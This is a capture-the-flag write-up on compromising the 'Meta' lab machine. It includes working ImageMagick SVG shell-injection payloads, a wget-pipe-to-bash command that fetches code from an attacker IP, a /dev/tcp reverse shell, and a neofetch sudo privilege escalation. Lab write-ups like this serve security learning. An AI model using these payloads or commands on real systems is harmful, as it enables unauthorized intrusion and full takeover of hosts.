# Meta

---

## Enumeration

- nmap TCP scan:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 1281175a5ac9c600dbf0ed9364fd1e08 (RSA)
|   256 b5e55953001896a6f842d8c7fb132049 (ECDSA)
|_  256 05e9df71b59f25036bd0468d05454420 (ED25519)
80/tcp open  http    Apache httpd
|_http-server-header: Apache
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://artcorp.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- The website redirects to the domain `artcorp.htb` -> added to /etc/hosts
- Found subdomain using `wfuzz`:

```
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                     
=====================================================================

000001492:   200        9 L      24 W       247 Ch      "dev01"
```

- MetaView uses exiftool on the image file to extract the data
- Looks vulnerable to [CVE-2021-22204](https://www.exploit-db.com/exploits/50911)
- Got revshell as `www-data`

```zsh
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.140] 57894
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ which python
$ which python3
/usr/bin/python3
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ ^Z
zsh: suspended  nc -lvnp 1337
                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 1337

www-data@meta:/var/www/dev01.artcorp.htb/metaview$ export TERM=xterm-256color
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ 
```

---

## Horizontal privesc -> TO user thomas

- Ran pspy

```
2022/11/29 23:59:01 CMD: UID=0    PID=2113   | /usr/sbin/CRON -f 
2022/11/29 23:59:01 CMD: UID=1000 PID=2115   | /bin/sh -c /usr/local/bin/convert_images.sh 
2022/11/29 23:59:01 CMD: UID=1000 PID=2116   | /bin/sh -c /usr/local/bin/convert_images.sh 
2022/11/29 23:59:01 CMD: UID=0    PID=2117   | /usr/sbin/CRON -f 
2022/11/29 23:59:01 CMD: UID=1000 PID=2118   | /bin/bash /usr/local/bin/convert_images.sh 
2022/11/29 23:59:01 CMD: UID=0    PID=2119   | /bin/sh -c rm /tmp/* 
2022/11/29 23:59:01 CMD: UID=1000 PID=2120   | pkill mogrify
```

- User `thomas` is periodically running `convert_images.sh` which is a custom script

```sh
#!/bin/bash
cd /var/www/dev01.artcorp.htb/convert_images/ && /usr/local/bin/mogrify -format png *.* 2>/dev/null
pkill mogrify
```

```shell
ww-data@meta:/var/www/dev01.artcorp.htb/convert_images$ mogrify

Version: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29 https://imagemagick.org
Copyright: © 1999-2020 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): fontconfig freetype jng jpeg png x xml zlib
Usage: mogrify [options ...] file [ [options ...] file ...]
```

- Found [SVG Exploit](https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html)
- Prepared payload and planted it in `convert_images` folder and waited until Thomas ran the mogrify command and it worked
- Payload:

```svg
<image authenticate='ff" `echo $(id)> /dev/shm/0wned`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
  <image xlink:href="msl:game.svg" height="100" width="100"/>
  </svg>
</image>
```

```bash
www-data@meta:/var/www/dev01.artcorp.htb/convert_images$ cat /dev/shm/0wned 
uid=1000(thomas) gid=1000(thomas) groups=1000(thomas)
```

- To get a revshell I prepared a revshell payload:

```sh
cat game.sh       

bash -i >& /dev/tcp/10.10.16.3/9001 0>&1
```

- The SVG payload:

```svg
<image authenticate='ff" `wget -O - 10.10.16.3/game.sh | bash`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
  <image xlink:href="msl:game.svg" height="100" width="100"/>
  </svg>
</image>
```

- Got revshell

```bash
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.140] 37130
bash: cannot set terminal process group (3388): Inappropriate ioctl for device
bash: no job control in this shell
thomas@meta:/var/www/dev01.artcorp.htb/convert_images$ whoami
whoami
thomas
thomas@meta:/var/www/dev01.artcorp.htb/convert_images$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<ges$ python3 -c 'import pty;pty.spawn("/bin/bash")'   
thomas@meta:/var/www/dev01.artcorp.htb/convert_images$ ^Z
zsh: suspended  nc -lvnp 9001
                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ stty raw -echo; fg       
[1]  + continued  nc -lvnp 9001

<artcorp.htb/convert_images$ export TERM=xterm-256color         

thomas@meta:/var/www/dev01.artcorp.htb/convert_images$ 
```

- Got user.txt and SSH rsa key

---

## PrivEsc to Root

- Ran linpeas.sh on the system and here are some interesting findings:

```
- User thomas may run the following commands on meta:
    (root) NOPASSWD: /usr/bin/neofetch \"\"

- ssh: PermitRootLogin no


```
```bash
thomas@meta:/dev/shm$ sudo -l
Matching Defaults entries for thomas on meta:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=XDG_CONFIG_HOME

User thomas may run the following commands on meta:
    (root) NOPASSWD: /usr/bin/neofetch \"\"
```

- https://gtfobins.github.io/gtfobins/neofetch
- Since the `XDG_CONFIG_HOME` is being kept during the sudo command, I just wrote `exec /bin/sh` in `/home/thomas/.config/neofetch/config.conf`

```bash
thomas@meta:~/.config/neofetch$ echo 'exec /bin/sh' >> config.conf
```

- now to get root shell:

```bash
thomas@meta:~/.config/neofetch$ sudo neofetch 
# whoami
root

```

---
